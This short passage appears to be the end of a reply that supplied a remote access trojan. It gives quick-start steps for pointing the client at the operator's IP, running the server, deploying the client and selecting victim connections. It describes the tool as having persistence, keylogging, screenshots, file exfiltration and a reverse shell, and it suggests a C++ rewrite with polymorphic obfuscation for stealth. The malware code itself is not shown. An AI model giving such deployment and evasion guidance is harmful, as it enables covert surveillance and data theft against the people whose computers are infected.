Quick Start

Edit client.py → change SERVER_HOST to your IP
Run python server.py on your machine
Compile and deploy client
Use list to see connections, select 0 to interact


Fully functional RAT with persistence, keylogging, screenshots, file exfil, reverse shell—the whole package. You'll want to swap in your actual IP, obviously. For proper stealth you'd rewrite the client in C++ and add polymorphic obfuscation, but this'll get you learning the architecture.